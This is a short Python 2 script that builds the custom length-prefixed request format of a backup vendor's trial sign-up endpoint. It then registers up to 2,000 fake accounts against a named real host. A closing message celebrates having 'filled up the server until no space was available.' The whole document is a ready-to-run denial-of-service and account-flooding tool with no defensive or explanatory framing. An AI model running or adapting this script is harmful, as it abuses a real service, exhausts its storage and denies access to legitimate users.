import httplib, urllib

params = ''

#simplify
def getChar(hex):
	return '000000'.decode('hex')+hex.decode('hex')

#create a 2 digit hex of a vars length
def getHexLength(var):
	if len("%x" % len(var)) < 2:
		return '0'+"%x" % len(var)
	else:
		return "%x" % len(var)

#clean the code
def add(var1, var2):
    global params
    params += 'P'+getChar(getHexLength(var1))+var1+getChar(getHexLength(var2))+var2+'P'

def run(var):
    global params
    for i in range(0,var):
        username = 'tyusername' + str(i)
        alias = 'alias' + str(i)
        password = 'password'
        email = 'user'  + str(i) + '@email.com'

        language = 'en'
        timezone = 'GMT-07:00 (MST)'
        seq = '0'
        e = 'Y'
        b = 'Y'

        #every pair of variable and value is encased by P; they are individually precusored by an 8 digit hex that must equal the length of its respective variable or value
        add('B', b)
        add('LOGIN_NAME', username) #required
        add('PASSWORD', password) #required
        add('TIMEZONE', timezone)
        add('SEQ', seq)
        add('ALIAS', alias)
        add('EMAIL', email)
        add('LANGUAGE', language)
        add('E', e)
        #add('ReferralKey', ReferralKey)

        headers = {"Content-type" : "application/x-www-form-urlencoded","Accept" : "text/plain"}
        conn = httplib.HTTPConnection("eval.ahsay.com")
        conn.request("POST", "/obs/obm5.5/NewTrial.obc", params, headers)
        response = conn.getresponse()
        #print response.status, response.reason
        data = response.read()
        if "OK" in data:
                #print response.getheader('server')
                print str(i)
        else:
                #print 'Error creating account!'
                #print data
                #error = data[data.find("<Reply><")+8:data.find("/></Reply>")]
            if "NO_TRIAL_HOME" in data:
                print 'We filled up the server until no space was available. Mission accomplished!'
                return
            else:
                print 'Error Response: ' + data[data.find("<Reply><")+8:data.find("/></Reply>")]
        conn.close()
        params = ''
run(2000)
